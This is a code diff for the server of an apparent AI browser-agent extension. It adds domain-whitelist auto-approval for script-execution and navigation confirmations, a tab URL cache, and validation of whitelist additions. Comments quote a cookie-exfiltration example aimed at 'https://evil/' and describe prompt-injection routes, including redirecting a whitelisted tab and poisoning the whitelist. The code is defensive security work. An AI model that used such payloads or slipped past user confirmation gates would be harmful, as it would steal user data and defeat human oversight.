@@ -5,12 +5,12 @@ import { execFile } from "child_process"
 import { randomUUID } from "crypto"
 import os from "os"
 import { URL } from "url"
-import { getConfig, initDataDir, configEvents, CONFIG_CHANGE_EVENT } from "./config"
+import { getConfig, saveConfig, initDataDir, configEvents, CONFIG_CHANGE_EVENT } from "./config"
 import { handleMessage } from "./message-router"
 import { ThreadManager } from "./threads/thread-manager"
 import { SkillEngine } from "./skills/skill-engine"
 import { HistoryStore } from "./history/store"
-import { checkHighRiskExecution, highRiskExecutionDeniedError, isTrustedDomain } from "./security"
+import { checkHighRiskExecution, highRiskExecutionDeniedError, isTrustedDomain, isAutoApprovedDomain } from "./security"
 import { SecurityConfirmationManager } from "./security-confirmation"
 import { securityPolicy, getTokenSecret } from "./security-policy"
 import { logger, type LogLevel } from "./logger"
@@ -49,6 +49,28 @@ export const pendingToolCalls = new Map<string, {
   reject: (reason: any) => void
   timer: NodeJS.Timeout
 }>()
+
+// Cache of tabId → url, populated from list_tabs responses. Used by the
+// evaluate/osascript_eval whitelist gate to resolve the acting domain so we
+// can decide whether to skip the confirmation dialog. Stale entries persist
+// until the next list_tabs refreshes them — acceptable for the whitelist
+// check (worst case: a tab navigates and we use an old hostname, which only
+// means we show a confirmation that could have been auto-approved).
+const tabUrlCache = new Map<number, string>()
+
+function refreshTabUrlCache(tabs: any[]): void {
+  if (!Array.isArray(tabs)) return
+  for (const t of tabs) {
+    if (t && typeof t.id === "number" && typeof t.url === "string") {
+      tabUrlCache.set(t.id, t.url)
+    }
+  }
+}
+
+function getCachedTabUrl(tabId: number | undefined | null): string | undefined {
+  if (typeof tabId !== "number") return undefined
+  return tabUrlCache.get(tabId)
+}
 
 // Exported for integration tests (audit item 2 / 12) so tests can drive
 // securityConfirmations.respond(...) when simulating user approval/denial.
@@ -134,6 +156,16 @@ export function createToolExecutor(ws: WebSocket) {
   mcpSessionByWs.set(ws, sessionId)
   return async (toolCallId: string, toolName: string, params: any, signal?: AbortSignal): Promise<{ success: boolean; data?: any; error?: string }> => {
     let finalParams = params || {}
+    // Normalize tabId to a number. LLMs occasionally pass "123" as a string;
+    // without this, getCachedTabUrl and the navigate/set_tab_url cache update
+    // would silently skip (typeof !== "number"), reintroducing the C1 stale-
+    // cache window and breaking domain auto-approval for that tabId.
+    if (finalParams.tabId != null) {
+      const n = typeof finalParams.tabId === "number"
+        ? finalParams.tabId
+        : Number(finalParams.tabId)
+      finalParams.tabId = Number.isFinite(n) ? n : undefined
+    }
     const startedAt = Date.now()
     // Notify extension: tool execution started (show in sidebar)
     ws.send(JSON.stringify({
@@ -194,65 +226,92 @@ export function createToolExecutor(ws: WebSocket) {
         logToolFinish(toolCallId, toolName, startedAt, result)
         return result
       }
-      // Audit item 2: default-deny. ALL evaluate/osascript_eval calls require
-      // interactive confirmation. The regex match (safety.dangerousApis) becomes
-      // a risk-preview escalation hint shown to the user — it no longer gates
-      // WHETHER to confirm, only HOW SCARY the preview looks. The previous model
-      // (confirm only when regex matched) was trivially bypassable via patterns
-      // like `location.assign('https://evil/?'+document.cookie)` that exfiltrate
-      // cookies without triggering any regex flag.
-      const safety = checkHighRiskExecution(toolName, code)
-      if (ws.readyState !== WebSocket.OPEN) {
-        const result = {
-          success: false,
-          error: highRiskExecutionDeniedError(toolName, safety.dangerousApis, "unavailable"),
-          data: { dangerous_apis_found: safety.dangerousApis },
-        }
-        logToolFinish(toolCallId, toolName, startedAt, result)
-        return result
-      }
-      logger.warn("security.confirmation.requested", {
-        tool_call_id: toolCallId,
-        tool_name: toolName,
-        dangerous_apis: safety.dangerousApis,
-      })
-      const token = securityPolicy.issueToken(toolName, code)
-      const decision = await securityConfirmations.request(
-        (data) => {
-          if (ws.readyState === WebSocket.OPEN) {
-            ws.send(JSON.stringify(data))
+
+      // Resolve acting domain so we can skip the confirmation dialog when the
+      // user has whitelisted the domain (or enabled the global auto-approve).
+      // evaluate({tabId}) → resolve via tabUrlCache. osascript_eval is EXCLUDED
+      // from domain-based auto-approval: it executes host AppleScript (arbitrary
+      // shell access), and its `url` parameter only locates a Chrome tab — not
+      // a meaningful trust anchor. Allowing it to be whitelisted by URL would
+      // let an attacker hide a destructive payload behind a whitelisted URL.
+      // osascript_eval still respects the global auto_approve_dangerous toggle
+      // (explicit user opt-in for unattended workflows).
+      const relevantDomain = toolName === "evaluate"
+        ? getDomainFromUrl(getCachedTabUrl(finalParams.tabId) || "")
+        : ""
+      const securityConfig = getConfig().security
+      const skipConfirmation = securityConfig.auto_approve_dangerous === true
+        || (relevantDomain !== "" && isAutoApprovedDomain(relevantDomain))
+
+      if (!skipConfirmation) {
+        // Audit item 2: default-deny. ALL evaluate/osascript_eval calls require
+        // interactive confirmation unless whitelisted above. The regex match
+        // (safety.dangerousApis) becomes a risk-preview escalation hint shown to
+        // the user — it no longer gates WHETHER to confirm, only HOW SCARY the
+        // preview looks.
+        const safety = checkHighRiskExecution(toolName, code)
+        if (ws.readyState !== WebSocket.OPEN) {
+          const result = {
+            success: false,
+            error: highRiskExecutionDeniedError(toolName, safety.dangerousApis, "unavailable"),
+            data: { dangerous_apis_found: safety.dangerousApis },
           }
-        },
-        { toolName, dangerousApis: safety.dangerousApis, code },
-      )
-      if (!decision.approved) {
-        const reason = decision.reason === "approved" ? "unavailable" : decision.reason
-        const result = {
-          success: false,
-          error: highRiskExecutionDeniedError(toolName, safety.dangerousApis, reason),
-          data: { dangerous_apis_found: safety.dangerousApis },
+          logToolFinish(toolCallId, toolName, startedAt, result)
+          return result
         }
-        logger.warn("security.confirmation.denied", {
+        logger.warn("security.confirmation.requested", {
           tool_call_id: toolCallId,
           tool_name: toolName,
-          reason,
           dangerous_apis: safety.dangerousApis,
         })
-        logToolFinish(toolCallId, toolName, startedAt, result)
-        return result
+        const decision = await securityConfirmations.request(
+          (data) => {
+            if (ws.readyState === WebSocket.OPEN) {
+              ws.send(JSON.stringify(data))
+            }
+          },
+          {
+            toolName,
+            dangerousApis: safety.dangerousApis,
+            code,
+            relevantDomains: relevantDomain ? [relevantDomain] : [],
+          },
+        )
+        if (!decision.approved) {
+          const reason = decision.reason === "approved" ? "unavailable" : decision.reason
+          const result = {
+            success: false,
+            error: highRiskExecutionDeniedError(toolName, safety.dangerousApis, reason),
+            data: { dangerous_apis_found: safety.dangerousApis },
+          }
+          logger.warn("security.confirmation.denied", {
+            tool_call_id: toolCallId,
+            tool_name: toolName,
+            reason,
+            dangerous_apis: safety.dangerousApis,
+          })
+          logToolFinish(toolCallId, toolName, startedAt, result)
+          return result
+        }
+        logger.info("security.confirmation.approved", { tool_call_id: toolCallId, tool_name: toolName })
+      } else {
+        logger.info("security.auto_approved", {
+          tool_call_id: toolCallId,
+          tool_name: toolName,
+          domain: relevantDomain || "unknown",
+          reason: securityConfig.auto_approve_dangerous ? "global_toggle" : "domain_whitelist",
+        })
       }
-      logger.info("security.confirmation.approved", { tool_call_id: toolCallId, tool_name: toolName })
-      // Issue a new token post-approval; the extension will validate it
+      // Issue a fresh token (post-approval or for auto-approved skip path)
       const approvedToken = securityPolicy.issueToken(toolName, code)
       finalParams = { ...finalParams, security_token: approvedToken.token }
-      void token
     }
 
     // Audit item 12: navigate / create_tab trust-domain gate. Agents can otherwise
     // drive the browser to ANY URL (including chrome://, file://, data:, or attacker
     // domains) with no confirmation — a credential-phishing / internal-page-pivot
     // vector via prompt injection. Require confirmation for URLs whose host is not
-    // in trusted_domains; block non-http(s) schemes outright.
+    // in trusted_domains or auto_approved_domains; block non-http(s) schemes outright.
     const URL_GATE_TOOLS = ["navigate", "create_tab", "set_tab_url"]
     if (URL_GATE_TOOLS.includes(toolName)) {
       const rawUrl = String(finalParams.url || "")
@@ -272,11 +331,16 @@ export function createToolExecutor(ws: WebSocket) {
         logToolFinish(toolCallId, toolName, startedAt, result)
         return result
       }
-      if (!isTrustedDomain(parsedUrl.hostname)) {
+      const host = parsedUrl.hostname
+      const securityConfig = getConfig().security
+      const skipUrlConfirmation = isTrustedDomain(host)
+        || isAutoApprovedDomain(host)
+        || securityConfig.auto_approve_dangerous === true
+      if (!skipUrlConfirmation) {
         if (ws.readyState !== WebSocket.OPEN) {
           const result = {
             success: false,
-            error: `Security Block: ${toolName} to untrusted domain "${parsedUrl.hostname}" requires user confirmation, but the WebSocket is not connected.`,
+            error: `Security Block: ${toolName} to untrusted domain "${host}" requires user confirmation, but the WebSocket is not connected.`,
           }
           logToolFinish(toolCallId, toolName, startedAt, result)
           return result
@@ -285,7 +349,7 @@ export function createToolExecutor(ws: WebSocket) {
           tool_call_id: toolCallId,
           tool_name: toolName,
           url: rawUrl,
-          host: parsedUrl.hostname,
+          host,
         })
         const decision = await securityConfirmations.request(
           (data) => {
@@ -297,6 +361,7 @@ export function createToolExecutor(ws: WebSocket) {
             toolName,
             dangerousApis: [],
             code: `navigate(${rawUrl})`,
+            relevantDomains: [host],
           },
         )
         if (!decision.approved) {
@@ -315,6 +380,16 @@ export function createToolExecutor(ws: WebSocket) {
           return result
         }
         logger.info("security.url_confirmation.approved", { tool_call_id: toolCallId, tool_name: toolName, url: rawUrl })
+      } else if (!isTrustedDomain(host)) {
+        // Skipped specifically because of auto_approved_domains or the global toggle
+        // (not because the host was already cookie-trusted). Log so audits can tell
+        // the two bypass paths apart.
+        logger.info("security.url_auto_approved", {
+          tool_call_id: toolCallId,
+          tool_name: toolName,
+          host,
+          reason: securityConfig.auto_approve_dangerous ? "global_toggle" : "domain_whitelist",
+        })
       }
     }
 
@@ -364,6 +439,38 @@ export function createToolExecutor(ws: WebSocket) {
     // Send tool execution command to extension
     return new Promise((resolve, reject) => {
       const finishAndResolve = (result: any) => {
+        // Refresh tab URL cache when list_tabs returns, so the evaluate
+        // whitelist gate can resolve tabId → hostname on the next call.
+        if (toolName === "list_tabs" && result?.success && Array.isArray(result.data)) {
+          refreshTabUrlCache(result.data)
+        }
+        // Synchronize cache after LLM-initiated navigation. A successful
+        // navigate/set_tab_url means the cached URL for this tabId is now stale;
+        // updating it prevents a prompt-injection attack where a malicious page
+        // (or attacker-controlled agent flow) navigates a whitelisted tab to an
+        // attacker domain and the next evaluate({tabId}) is auto-approved
+        // against the OLD (still-whitelisted) hostname.
+        // NOTE: page-initiated navigation via window.location is a residual risk
+        // requiring chrome.tabs.onUpdated subscription on the extension side.
+        if (
+          result?.success === true &&
+          (toolName === "navigate" || toolName === "set_tab_url") &&
+          typeof finalParams.tabId === "number" &&
+          typeof finalParams.url === "string"
+        ) {
+          tabUrlCache.set(finalParams.tabId, finalParams.url)
+        }
+        // Cache the new tab created by create_tab so the next evaluate({tabId})
+        // can be domain-whitelisted without waiting for a fresh list_tabs.
+        if (
+          toolName === "create_tab" &&
+          result?.success === true &&
+          result.data &&
+          typeof result.data.id === "number" &&
+          typeof result.data.url === "string"
+        ) {
+          tabUrlCache.set(result.data.id, result.data.url)
+        }
         logToolFinish(toolCallId, toolName, startedAt, result)
         resolve(result)
       }
@@ -1164,11 +1271,47 @@ export async function startServer() {
         }
 
         if (msg.type === "security.confirmation.response") {
-          // Pass `ws` so SecurityConfirmationManager can enforce origin binding
-          // (only the socket that owns the pending confirmation may resolve it).
+          const confirmationId = String(msg.confirmation_id || "")
+          const approved = msg.approved === true
+
+          // Validate add_to_whitelist against the domains actually shown in the
+          // dialog. Without this check, any loopback WS peer could ship a
+          // crafted response with add_to_whitelist: ["*", "*.com", "attacker.com"]
+          // and permanently bypass the dangerous-tool gate.
+          const rawWhitelist: string[] = Array.isArray(msg.add_to_whitelist)
+            ? msg.add_to_whitelist.map((p: any) => String(p || "").trim()).filter(Boolean)
+            : []
+          const relevantDomains = securityConfirmations.getRelevantDomains(confirmationId) || []
+          const allowedPatterns = new Set<string>()
+          for (const d of relevantDomains) {
+            const lower = d.toLowerCase()
+            allowedPatterns.add(lower)
+            allowedPatterns.add(`*.${lower}`)
+          }
+          const validPatterns: string[] = []
+          const rejectedPatterns: string[] = []
+          for (const p of rawWhitelist) {
+            if (allowedPatterns.has(p.toLowerCase())) {
+              validPatterns.push(p)
+            } else {
+              rejectedPatterns.push(p)
+            }
+          }
+          if (rejectedPatterns.length > 0) {
+            logger.warn("security.whitelist.invalid_patterns_rejected", {
+              confirmation_id: confirmationId,
+              relevant_domains: relevantDomains,
+              rejected: rejectedPatterns,
+            })
+          }
+
+          // Resolve the confirmation FIRST so a saveConfig failure cannot hang
+          // the approved tool call. The whitelist persistence runs after, on a
+          // best-effort basis. By the time the LLM's next tool call reaches the
+          // whitelist gate (next macrotask), fs.writeFileSync has completed.
           const responded = securityConfirmations.respondFrom(
-            String(msg.confirmation_id || ""),
-            msg.approved === true,
+            confirmationId,
+            approved,
             ws,
           )
           if (!responded) {
@@ -1177,8 +1320,42 @@ export async function startServer() {
             // [C-SEC-2]: do not silently drop — log so operators can spot the
             // pattern (e.g., a rogue local process trying to self-approve).
             logger.warn("security.confirmation.origin_mismatch_or_unknown", {
-              confirmation_id: String(msg.confirmation_id || ""),
-              approved_requested: msg.approved === true,
+              confirmation_id: confirmationId,
+              approved_requested: approved,
+            })
+          }
+
+          // Only persist whitelist additions when the confirmation was actually
+          // resolved by THIS response. If respondFrom returned false (origin
+          // mismatch, unknown id, or already-expired entry), the response is
+          // not authoritative — accepting its add_to_whitelist payload would
+          // let any loopback WS peer that can guess a confirmation_id poison
+          // auto_approved_domains without ever resolving the prompt.
+          if (responded && approved && validPatterns.length > 0) {
+            try {
+              const current = getConfig().auto_approved_domains || []
+              const seen = new Set(current.map((d: string) => d.toLowerCase()))
+              const newPatterns = validPatterns.filter(p => !seen.has(p.toLowerCase()))
+              if (newPatterns.length > 0) {
+                saveConfig({ auto_approved_domains: [...current, ...newPatterns] })
+                logger.info("security.whitelist.added", {
+                  confirmation_id: confirmationId,
+                  patterns: newPatterns,
+                })
+              }
+            } catch (err: any) {
+              // Persistence is best-effort — don't fail the tool call.
+              logger.error("security.whitelist.persist_failed", {
+                confirmation_id: confirmationId,
+                error: err?.message || String(err),
+              })
+            }
+          } else if (!responded && validPatterns.length > 0) {
+            // Defensive: log every attempt to add via a non-authoritative response
+            // so operators can spot a peer probing confirmation ids.
+            logger.warn("security.whitelist.add_ignored_non_authoritative", {
+              confirmation_id: confirmationId,
+              valid_patterns: validPatterns,
             })
           }
           return
